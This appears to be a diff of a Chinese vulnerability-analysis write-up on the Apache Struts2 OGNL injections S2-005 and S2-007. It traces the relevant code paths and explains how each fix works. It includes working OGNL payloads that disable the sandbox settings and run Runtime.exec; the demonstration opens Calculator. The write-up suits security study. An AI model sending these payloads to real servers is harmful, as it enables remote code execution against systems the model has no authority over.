@@ -202,7 +202,7 @@ allowProtectedAccess = false
 allowPackageProtectedAccess = false
 ```
 
-在静态方法`@java.lang.Runtime@getRuntime()`调用时调用栈如下
+在静态方法`@java.lang.Runtime@getRuntime()`调用时调用栈如下（大多漏洞调试时都可以将断点打到`SecurityMemberAccess.isAccessible()`方法上）
 ```
 OgnlRuntime.callStaticMethod()
   XWorkMethodAccessor.callStaticMethod()  -> 这步判断xwork.MethodAccessor.denyMethodExecution
@@ -217,7 +217,7 @@ if (Modifier.isStatic(modifiers) && member instanceof Method && !this.getAllowSt
     allow = false;
 }
 
-if (!allow) { // 如果allow被赋值为false，就return false。
+if (!allow) { // 如果allow为false，就return false。所以需要将allow赋值为true
     return false;
 } else {
     return !super.isAccessible(context, target, member, propertyName) ? false : this.isAcceptableProperty(propertyName);
@@ -254,13 +254,26 @@ protected boolean isExcluded(String paramName) {
     return false;
 }
 ```
-这些防御方式都是SecurityMemberAccess中新加的。想要绕过防御，根据上述调用栈，在将denyMethodExecution设为false的基础上，(1) 设置SecurityMemberAccess的allowStaticMethodAccess属性为true，(2)设置SecurityMemberAccess的acceptProperties属性为空。所以S2-005的payload如下。
+这些防御方式都是SecurityMemberAccess中新加的。想要绕过防御，根据上述调用栈，在将denyMethodExecution设为false的基础上，(1) 设置SecurityMemberAccess的allowStaticMethodAccess属性为true，(2)设置SecurityMemberAccess的excludeProperties属性为空。所以S2-005的payload如下。
 ```
 (a)(('\u0023_memberAccess.excludeProperties\u003d@java.util.Collections@EMPTY_SET')(bla))&('\u0023_memberAccess.allowStaticMethodAccess\u003dtrue')(bla)(bla)&(a)(('\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003dfalse')(bla))&(b)(('\u0023ret\u003d@java.lang.Runtime@getRuntime().exec(\'open\u0020/System/Applications/Calculator.app\')')(bla))
 ```
 
+S2-005在修复时，加强了ParametersInterceptor的`acceptedParamNames`的正则过滤。在加强了`ParametersInterceptor.setParameters()`处理时会先判断是否为acceptableName。用的就是如下的正则匹配来判断
+```
+acceptedParamNames="[a-zA-Z0-9\\.\\]\\[\\(\\)_'\\s]+";
+```
+S2-003时的acceptableName如下
+```java
+protected boolean acceptableName(String name) {
+    return name.indexOf(61) == -1 && name.indexOf(44) == -1 && name.indexOf(35) == -1 && name.indexOf(58) == -1;
+} // 分别对应 `=` `,` `#` `:`
+```
+相比而言
+
+
 ### S2-007
-漏洞demo如下，此漏洞场景是配置了验证规则，类型转换出错造成了错的字符串拼接而进行OGNL解析。验证规则可以采用xml的形式，通过文件名`<ActionClassName>-validation.xml`和要验证的Action关联
+漏洞demo如下
 ```xml
 <validators>
     <field name="age">
@@ -272,11 +285,60 @@ protected boolean isExcluded(String paramName) {
     </field>
 </validators>
 ```
+此漏洞场景是配置了验证规则（xml形式），age的参数值需要为int型。通过文件名`<ActionClassName>-validation.xml`和要验证的Action关联。如果传入字符串型，就会被`ConversionErrorInterceptor`拦截，其拦截逻辑如下
+```
+public String intercept(ActionInvocation invocation) throws Exception {
+    ActionContext invocationContext = invocation.getInvocationContext();
+    Map<String, Object> conversionErrors = invocationContext.getConversionErrors();
+    ValueStack stack = invocationContext.getValueStack();
+    HashMap<Object, Object> fakie = null;
+    Iterator i$ = conversionErrors.entrySet().iterator();
+    while(i$.hasNext()) {
+        ...
+        fakie.put(propertyName, this.getOverrideExpr(invocation, value)); // value为age传入的字符串，fakie即为"age"->"'payload'"
+    }
+    if (fakie != null) {
+        invocation.getStack().setExprOverrides(fakie); //  OgnlValueStack.overrides赋值为fakie的值
+    }
+    return invocation.invoke(); 
+```
+getOverrideExpr会取出传入的字符串，并用单引号包裹
+```
+protected Object getOverrideExpr(ActionInvocation invocation, Object value) {
+    stack.push(value); // 把传入的value入栈
+    var4 = "'" + stack.findValue("top", String.class) + "'"; // 把栈头的元素取出来，并用单引号包裹，即 `payload`
+    return var4;
+}
+```
+验证规则匹配到参数类型错误后，会跳转到配置的错误（或跳转）页面，然后Struts2会对jsp页面上的标签进行解析。这部分开始和S2-001非常类似。doEngTag解析标签，执行到`TextParseUtil.translateVariables()`，对age进行值的查询，然后OgnlValueStack.getValue()对值进行OGNL解析
+```
+private String lookupForOverrides(String expr) {
+    if (this.overrides != null && this.overrides.containsKey(expr)) {
+        expr = (String)this.overrides.get(expr); // 从OgnlValueStack.overrides取出age对应的值
+    }
+    return expr;
+}
+```
 payload如下
 ```
 ' + (#_memberAccess["allowStaticMethodAccess"]=true,#foo=new java.lang.Boolean("false") ,#context["xwork.MethodAccessor.denyMethodExecution"]=#foo,@java.lang.Runtime@getRuntime().exec('open /System/Applications/Calculator.app')) + '
 ```
-
+S2-007这里用的高版本2.2.3进行测试，和S2-005用的版本区别在于，多了个`if(name==null)`的判断，name为空，直接返回true。而无需将excludeProperties属性置为空
+```
+protected boolean isAcceptableProperty(String name) {
+    if (name == null) {
+        return true;
+    } else {
+        return this.isAccepted(name) && !this.isExcluded(name);
+    }
+}
+```
+S2-007的payload闭合了`getOverrideExpr()`方法中添加的单引号。这样OGNL可以正常解析。修复时在`stack.findValue("top") `后增加了一步转义，先对字符串中的双引号进行转义，然后再用双引号包裹。这样避免了双引号闭合的可能。
+```
+protected String escape(Object value){
+    return "\"" + StringEscapeUtils.escapeJava(String.valueOf(value)) + "\"";
+}
+```
 
 
 
